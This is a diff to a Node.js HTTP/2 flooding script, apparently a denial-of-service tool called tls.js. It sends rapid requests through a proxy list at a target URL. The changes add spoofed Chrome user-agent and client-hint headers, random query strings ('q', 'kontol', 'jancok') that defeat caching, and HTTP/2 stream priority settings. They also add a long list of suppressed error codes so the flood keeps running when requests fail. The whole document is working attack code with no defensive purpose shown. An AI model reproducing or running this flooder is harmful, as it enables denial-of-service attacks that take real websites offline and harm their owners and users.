@@ -5,29 +5,11 @@
  const url = require("url");
  const crypto = require("crypto");
  const fs = require("fs");
- const os = require('os'); 
- const { HeaderGenerator } = require('header-generator');
-let headerGenerator = new HeaderGenerator({
-    browsers: [
-       { name: "firefox" },
-       { name: "opera" },
-       { name: "edge" },
-       { name: "chrome" },
-    ],
-    devices: [
-        "desktop",
-        "mobile"
-    ],
-    operatingSystems: [
-        "windows",
-        "linux",
-        "android",
-    ]
-});
+ const os = require('os');
  process.setMaxListeners(0);
  require("events").EventEmitter.defaultMaxListeners = 0;
 
- if (process.argv.length < 7){console.log(`Example: node tls.js https://tls.mrrage.xyz 500 8 1 proxy.txt`); process.exit();}
+ if (process.argv.length < 7){console.log(`Example: node tls.js https://target.com 120 8 4 proxy.txt`); process.exit();}
  
  const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
  const ciphers = "GREASE:" + [
@@ -185,20 +167,54 @@ if (cluster.isMaster) {
  function randomElement(elements) {
      return elements[randomIntn(0, elements.length)];
  }
- 
+ function generateRandomString(minLength, maxLength) {
+		const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+		const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
+		const randomStringArray = Array.from({
+			length
+		}, () => {
+			const randomIndex = Math.floor(Math.random() * characters.length);
+			return characters[randomIndex];
+		});
+		return randomStringArray.join('');
+	}
  function runFlooder() {
      const proxyAddr = randomElement(proxies);
      const parsedProxy = proxyAddr.split(":");
-     let bexRandomHeaders = headerGenerator.getHeaders();
+     const version = Math.floor(Math.random() * (124 - 115 + 1)) + 115;
+     const useragentWindows = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`;
+     const useragentAndroid = `Mozilla/5.0 (Linux; Android 10; k) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36`;
+     const finnalUa = Math.random() < 0.5 ? useragentWindows : useragentAndroid;
 
 let headers = {
-":authority": parsedTarget.host,
 ":method": "GET",
-":path": parsedTarget.path,
+":authority": parsedTarget.host,
 ":scheme": "https",
+":path": parsedTarget.path + "?q=bexnxx" + generateRandomString(1,6) + '&kontol=' +  generateRandomString(1,12) + '&jancok=' + generateRandomString(1,12),
+'User-Agent': finnalUa,
+'Accept': Math.random() < 0.5 ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" : "application/json",
+'Accept-Language': 'en-US,en;q=0.5',
+'Accept-Encoding': Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br",
+'sec-ch-ua': `"Chromium";v="${version}", "Google Chrome";v="${version}", "Not-A.Brand";v="99"`,
+"Sec-CH-UA-Full-Version-List": `"chrome";v="${version}.0.4430.212", "Not A;Brand";v="99.0.0.0"`,
+"sec-ch-ua-mobile": finnalUa === useragentAndroid ? "?1" : "?0",
+'Sec-Fetch-Dest': 'document',
+'Sec-Fetch-Mode': 'navigate',
+'Sec-Fetch-Site': 'none',
+'Sec-Fetch-User': Math.random() < 0.75 ? "?1;?1" : "?1",
+'Upgrade-Insecure-Requests': '1',
+'X-Requested-With': 'XMLHttpRequest',
+'DNT': '1',
+'TE': 'Trailers',
+'Cache-Control': 'no-cache',
+'Pragma': 'no-cache',
+'If-Modified-Since': '0',
+'X-Frame-Options': 'DENY',
+'X-XSS-Protection': '1; mode=block',
+'X-Content-Type-Options': 'nosniff',
+'Content-Security-Policy': "default-src 'self'",
 "referer": "https://" + parsedTarget.host + parsedTarget.path,
 "origin": "https://" + parsedTarget.host,
-...bexRandomHeaders,
 };
  
      const proxyOptions = {
@@ -254,13 +270,17 @@ let headers = {
          client.on("connect", () => {
             const IntervalAttack = setInterval(() => {
                 for (let i = 0; i < args.Rate; i++) {
-                    const request = client.request(headers)
-                    .on("response", response => {
+                    const request = client.request(headers);
+                    request.priority({
+						weight: Math.random() < 0.5 ? 255 : 220,
+						depends_on: 0,
+						exclusive: true
+					});
+					request.on('response', response => {
                         request.close();
                         request.destroy();
                         return
                     });
-    
                     request.end();
                 }
             }, 500); 
@@ -284,5 +304,12 @@ let headers = {
  
  setTimeout(KillScript, args.time * 1000);
  
- process.on('uncaughtException', error => {});
- process.on('unhandledRejection', error => {});
+ ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'],
+ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
+process.on('uncaughtException', function(e) {
+	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
+}).on('unhandledRejection', function(e) {
+	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
+}).on('warning', e => {
+	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
+}).setMaxListeners(0);
